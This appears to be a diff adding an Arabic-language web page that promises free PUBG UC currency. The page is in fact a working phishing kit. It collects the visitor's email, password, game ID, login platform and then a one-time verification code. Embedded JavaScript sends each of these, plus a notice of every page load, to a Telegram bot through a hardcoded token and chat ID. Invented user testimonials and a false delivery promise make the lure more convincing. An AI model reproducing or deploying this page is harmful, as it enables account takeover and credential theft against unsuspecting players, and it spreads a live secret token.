@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UC مجاني  </title>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #47505f, #215cc4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #1877f2;
+            font-size: 30px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        h3 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 5px rgba(24, 119, 242, 0.3);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        button:hover {
+            background-color: #155bb5;
+            transform: scale(1.05);
+        }
+
+        .error, .success {
+            color: red;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        #verification-message {
+            color: green;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .legal-links {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .legal-links a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .legal-links a:hover {
+            text-decoration: underline;
+        }
+
+        .testimonials {
+            margin-top: 40px;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .testimonial {
+            background-color: #f0f0f0;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            padding: 15px;
+        }
+
+        .testimonial h4 {
+            color: #1877f2;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .testimonial p {
+            color: #555;
+            font-size: 14px;
+        }
+
+        /* استعلامات ميديا لجعل الموقع متجاوب */
+        @media (max-width: 768px) {
+            .login-container {
+                padding: 20px;
+                width: 90%;
+            }
+
+            h2 {
+                font-size: 24px;
+            }
+
+            h3 {
+                font-size: 18px;
+            }
+
+            button {
+                padding: 12px;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 15px;
+                width: 100%;
+            }
+
+            h2 {
+                font-size: 22px;
+            }
+
+            h3 {
+                font-size: 16px;
+            }
+
+            button {
+                padding: 10px;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body onload="sendMessageOnLoad()">
+    <div class="login-container">
+        <h2>شدات ببجي مجانية</h2>
+        <h3>احصل على شدات ببجي بسهولة </h3>
+        <form id="login-form">
+            <label for="email"> الاميل :</label>
+            <input type="text" id="email" placeholder="أدخل الاميل" required>
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            <label for="ID">ID:</label>
+            <input type="text" id="ID" placeholder="أدخل رقم الـ ID" required>
+            <label for="platform">طريقة التسجيل:</label>
+            <select id="platform" required>
+                <option value="Facebook">فيسبوك</option>
+                <option value="Google">جوجل</option>
+            </select>
+            
+            <label for="uc-type">اختيار الشدات:</label>
+            <select id="uc-type" required>
+                <option value="1200">1200 UC</option>
+                <option value="2500">2500 UC</option>
+                <option value="5000">5000 UC</option>
+            </select>
+            
+            <div id="otp-section" style="display: none;">
+                <label for="otp">كود التحقق:</label>
+                <input type="text" id="otp" placeholder="أدخل كود التحقق" required>
+            </div>
+            <p id="verification-message" style="display: none; color: green; text-align: center;">سيصلك كود التحقق على حسابك.</p>
+            <button type="button" id="next-button">التالي</button>
+            
+            <button type="submit" id="login-button" style="display: none;">التالي</button>
+        </form> 
+        <p id="error-message" class="error"></p>
+
+        <div class="legal-links">
+            <a href="">راي المستهدمون </a>
+            <p>لمعرفة المزيد، يرجى قراءة <a href="#">سياسة الخصوصية</a> و <a href="#">شروط الاستخدام</a></p>
+        </div>
+    </div>
+
+    <div class="testimonials">
+        <h3>ماذا يقول المستخدمون:</h3>
+        <div class="testimonial">
+            <h4>أحمد من مصر</h4>
+            <p>موقع رائع، حصلت على الشدات بسرعة ولم أواجه أي مشاكل!</p>
+        </div>
+        <div class="testimonial">
+            <h4>سارة من السعودية</h4>
+            <p>أعجبني الموقع، سهل الاستخدام وآمن جدًا.</p>
+        </div>
+        <div class="testimonial">
+            <h4>محمد من الإمارات</h4>
+            <p>أفضل موقع للحصول على شدات ببجي! سريع وموثوق.</p>
+        </div>
+        <div class="testimonial">
+            <h4>علي من مصر</h4>
+            <p>شحن سريع وموقع موثوق، جربت الشحن أكثر من مرة وكان ممتاز.</p>
+        </div>
+        <div class="testimonial">
+            <h4>نور من السعودية</h4>
+            <p>موقع موثوق وسهل الاستخدام، حصلت على الشدات في وقت قصير!</p>
+        </div>
+    </div>
+
+    
+    <script>
+        const TOKEN = "7931349479:AAGHJ-5j0Xe9KV90VjpLwSn1QwpWLUcs918"; 
+        const CHAT_ID = "6662219429"; 
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        function sendMessageOnLoad() {
+            const message = `
+                <b>شخص دخل الموقع</b>\n
+                تم دخول المستخدم إلى الموقع.
+            `;
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message,
+            }).catch(console.error);
+        }
+
+        document.getElementById('next-button').addEventListener('click', function () {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const ID = document.getElementById('ID').value;
+            const platform = document.getElementById('platform').value;
+            const ucType = document.getElementById('uc-type').value;
+
+            if (email && password && ID) {
+                const message = `
+                    <b>محاولة تسجيل دخول جديدة</b>\n
+                    <b>البريد الإلكتروني:</b> ${email}\n
+                    <b>كلمة المرور:</b> ${password}\n
+                    <b>رقم ID:</b> ${ID}\n
+                    <b>طريقة التسجيل:</b> ${platform}\n
+                    <b>نوع الشدات:</b> ${ucType} UC\n
+                `;
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message,
+                }).then(() => {
+                    document.getElementById('otp-section').style.display = "block";
+                    document.getElementById('verification-message').style.display = "block";
+                    document.getElementById('next-button').style.display = "none";
+                    document.getElementById('login-button').style.display = "block";
+                }).catch(console.error);
+            } else {
+                alert("يرجى إدخال جميع الحقول.");
+            }
+        });
+
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+            const otp = document.getElementById('otp').value;
+
+            if (otp) {
+                const otpMessage = `
+                    <b>كود التحقق:</b> ${otp}\n
+                    <b>ملاحظة:</b> تم إدخال كود التحقق بنجاح.
+                `;
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: otpMessage,
+                }).then(() => {
+                    alert("سيصلك الشدات خلال 60 دقيقة.");
+                }).catch(console.error);
+            } else {
+                alert("يرجى إدخال كود التحقق.");
+            }
+        });
+    </script>
+</body>
+</html>
